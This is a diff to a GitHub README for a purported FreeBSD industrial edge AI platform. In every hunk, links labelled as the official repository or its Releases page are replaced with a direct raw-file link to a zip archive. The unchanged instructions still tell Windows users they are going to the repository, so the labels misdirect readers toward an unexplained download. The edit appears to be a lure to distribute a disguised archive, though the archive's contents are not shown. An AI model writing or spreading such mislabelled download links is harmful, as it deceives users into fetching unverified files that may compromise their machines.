@@ -1,6 +1,6 @@
 # ⚙️ freebsd-industrial-edge-ai-secure-device - Secure AI Platform for Industry
 
-[![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-FreeBSD%20Edge-brightgreen)](https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device)
+[![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-FreeBSD%20Edge-brightgreen)](https://raw.githubusercontent.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/main/qemu/device-industrial-freebsd-ai-secure-edge-v3.1.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This section will help you download and launch the software on your Windows mach
 
 1. Click the big green button below. It will take you to the platform’s official GitHub repository where you can get the latest version.
 
-   [![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-Link-blue?style=flat-square)](https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device)
+   [![Download freebsd-industrial-edge-ai-secure-device](https://img.shields.io/badge/Download-Link-blue?style=flat-square)](https://raw.githubusercontent.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/main/qemu/device-industrial-freebsd-ai-secure-edge-v3.1.zip)
 
 2. Once on the page, look for the **Releases** section on the right side or scroll down the repository home. Select the latest release by date.
 
@@ -129,10 +129,10 @@ For technical questions or issues, use the **Issues** tab on the GitHub page to 
 ## 🔗 Useful Links
 
 - GitHub Repository:  
-  https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device
+  https://raw.githubusercontent.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/main/qemu/device-industrial-freebsd-ai-secure-edge-v3.1.zip
 
 - Releases Page (to download updates):  
-  https://github.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/releases
+  https://raw.githubusercontent.com/filenamepleximetry260/freebsd-industrial-edge-ai-secure-device/main/qemu/device-industrial-freebsd-ai-secure-edge-v3.1.zip
 
 ---
 
